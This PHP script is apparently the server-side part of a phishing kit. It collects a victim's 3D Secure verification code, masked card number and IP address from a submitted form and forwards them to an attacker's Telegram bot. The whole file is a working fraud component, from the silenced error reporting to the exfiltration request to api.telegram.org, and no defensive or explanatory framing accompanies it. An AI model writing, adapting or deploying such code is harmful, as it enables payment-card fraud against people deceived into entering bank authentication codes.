<?php
error_reporting(0);

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $secure_code = $_POST['secure_code'] ?? 'N/A';
    $masked_card = $_POST['masked_card'] ?? 'N/A';

    // Get IP address
    $ip_address = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    // Telegram Bot Configuration
    $telegramBotToken = $_SESSION['botToken']; // Replace with your Telegram Bot Token
    $chatId = $_SESSION['chatId']; // Replace with your Telegram Chat ID

    // Format message with Markdown for clickable copyable values
$message = "🔒 3D Secure Verification Submission:\n" .
           "🔑 *Secure Code*: `$secure_code`\n" .
           "💳 *Masked Card Number*: `$masked_card`\n" .
           "🌐 *IP Address*: `$ip_address`";

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    // Respond with JSON for AJAX
    header('Content-Type: application/json');
    if ($result) {
        echo json_encode(['status' => 'success']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send Telegram message']);
    }
    exit;
}
?>